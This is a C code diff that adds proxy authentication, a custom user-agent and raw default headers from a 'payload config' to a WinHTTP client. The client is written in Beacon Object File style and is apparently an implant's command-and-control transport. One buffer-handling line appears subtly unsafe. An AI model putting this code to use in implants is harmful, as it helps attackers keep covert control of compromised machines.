@@ -89,11 +89,15 @@ WINBASEAPI size_t MSVCRT$strlen(const char *str);
 
 WINBASEAPI int MSVCRT$strcmp(const char *s1, const char *s2);
 
+WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);
+
 WINBASEAPI void MSVCRT$free(void *ptr);
 
 WINBASEAPI void* MSVCRT$realloc(void *ptr, size_t size);
 
 WINBASEAPI int MSVCRT$_snwprintf_s(wchar_t *buffer, size_t sizeOfBuffer, size_t count, const wchar_t *format, ...);
+
+WINBASEAPI int MSVCRT$_snprintf(char *buffer, size_t size, const char *format, ...);
 
 WINBASEAPI size_t MSVCRT$wcslen(const wchar_t *str);
 
@@ -140,7 +144,38 @@ static const LPWSTR HttpMethodToWideString(HttpMethod method);
  * Core Functions Implementation
  * ============================================================================ */
 
-HttpHandle* HttpInit(DWORD https_enabled) {
+static LPWSTR HttpBuildProxyString(const char *proxy_host, INTERNET_PORT proxy_port) {
+    /* "host:port" */
+    size_t host_len = MSVCRT$strlen(proxy_host);
+    size_t needed = host_len + 16;
+    char *ascii = (char*)MSVCRT$malloc(needed);
+    LPWSTR wide = NULL;
+    if (!ascii) {
+        return NULL;
+    }
+    MSVCRT$strcpy_s(ascii, needed, proxy_host);
+    /* append :port (port 0 means default 80/443 handling by WinHTTP) */
+    {
+        char port_buf[16];
+        int len = MSVCRT$_snprintf(port_buf, sizeof(port_buf), ":%u", (unsigned int)proxy_port);
+        if (len > 0) {
+            MSVCRT$strcpy_s(ascii + host_len, needed - host_len, port_buf);
+        }
+    }
+    wide = HttpUtf8ToWide(ascii);
+    MSVCRT$free(ascii);
+    return wide;
+}
+
+HttpHandle* HttpInit(
+    DWORD https_enabled,
+    const char *user_agent,
+    const char *default_headers,
+    const char *proxy_host,
+    INTERNET_PORT proxy_port,
+    const char *proxy_user,
+    const char *proxy_pass
+) {
     HttpHandle *client = (HttpHandle*)MSVCRT$malloc(sizeof(HttpHandle));
     if (!client) {
         return NULL;
@@ -150,20 +185,52 @@ HttpHandle* HttpInit(DWORD https_enabled) {
     MSVCRT$memset(client, 0, sizeof(HttpHandle));
     client->https_enabled = https_enabled;
     client->response_timeout_ms = 30000;  /* Default 30 seconds */
-    MSVCRT$strcpy_s(client->user_agent, sizeof(client->user_agent), "LibHttp/1.0");
+    if (user_agent != NULL && user_agent[0] != '\0') {
+        MSVCRT$strcpy_s(client->user_agent, sizeof(client->user_agent), user_agent);
+    } else {
+        MSVCRT$strcpy_s(client->user_agent, sizeof(client->user_agent), "LibHttp/1.0");
+    }
+    if (default_headers != NULL) {
+        MSVCRT$strcpy_s(client->default_headers, sizeof(client->default_headers), default_headers);
+    }
 
-    /* Create WinHTTP session */
+    /* Create WinHTTP session: explicit proxy when configured, otherwise auto-detect */
+    LPWSTR wide_proxy = NULL;
+    DWORD access_type = WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY;
+    if (proxy_host != NULL && proxy_host[0] != '\0') {
+        wide_proxy = HttpBuildProxyString(proxy_host, proxy_port);
+        access_type = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+    }
     client->session_handle = WINHTTP$WinHttpOpen(
         L"LibHttp/1.0",
-        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
-        WINHTTP_NO_PROXY_NAME,
+        access_type,
+        wide_proxy ? wide_proxy : WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
         0
     );
+    if (wide_proxy) {
+        MSVCRT$free(wide_proxy);
+    }
 
     if (!client->session_handle) {
         MSVCRT$free(client);
         return NULL;
+    }
+
+    /* Proxy credentials */
+    if (proxy_user != NULL && proxy_user[0] != '\0') {
+        LPWSTR wide_user = HttpUtf8ToWide(proxy_user);
+        if (wide_user) {
+            WINHTTP$WinHttpSetOption(client->session_handle, WINHTTP_OPTION_PROXY_USERNAME, wide_user, (MSVCRT$wcslen(wide_user) + 1) * sizeof(WCHAR));
+            MSVCRT$free(wide_user);
+        }
+        if (proxy_pass != NULL) {
+            LPWSTR wide_pass = HttpUtf8ToWide(proxy_pass);
+            if (wide_pass) {
+                WINHTTP$WinHttpSetOption(client->session_handle, WINHTTP_OPTION_PROXY_PASSWORD, wide_pass, (MSVCRT$wcslen(wide_pass) + 1) * sizeof(WCHAR));
+                MSVCRT$free(wide_pass);
+            }
+        }
     }
 
     /* Set default options on session */
@@ -277,6 +344,10 @@ BOOL HttpRequest(HttpHandle *handle, HttpMethod method, const HttpURI *uri, cons
     int32_t user_agent_in_headers = 0;
     DWORD header_count = headers ? headers->count : 0;
     HttpHeader *header_array = headers ? headers->headers : NULL;
+    const char *raw_headers = (headers == NULL) ? handle->default_headers : NULL;
+    if (raw_headers != NULL && MSVCRT$strstr(raw_headers, "User-Agent") != NULL) {
+        user_agent_in_headers = 1;
+    }
     for (DWORD i = 0; i < header_count; i++) {
         if (MSVCRT$strcmp(header_array[i].name, "User-Agent") == 0) {
             user_agent_in_headers = 1;
@@ -309,6 +380,19 @@ BOOL HttpRequest(HttpHandle *handle, HttpMethod method, const HttpURI *uri, cons
         }
         MSVCRT$free(wide_name);
         MSVCRT$free(wide_value);
+    }
+
+    /* Raw default headers from the payload config (already "Name: value\r\n" format) */
+    if (raw_headers != NULL && raw_headers[0] != '\0') {
+        LPWSTR wide_raw = HttpUtf8ToWide(raw_headers);
+        if (wide_raw) {
+            SIZE_T needed = MSVCRT$_snwprintf_s(header_ptr, header_buffer_remaining, _TRUNCATE, L"%s", wide_raw);
+            if (needed > 0) {
+                header_ptr += needed;
+                header_buffer_remaining -= needed;
+            }
+            MSVCRT$free(wide_raw);
+        }
     }
 
     /* Prepare body */
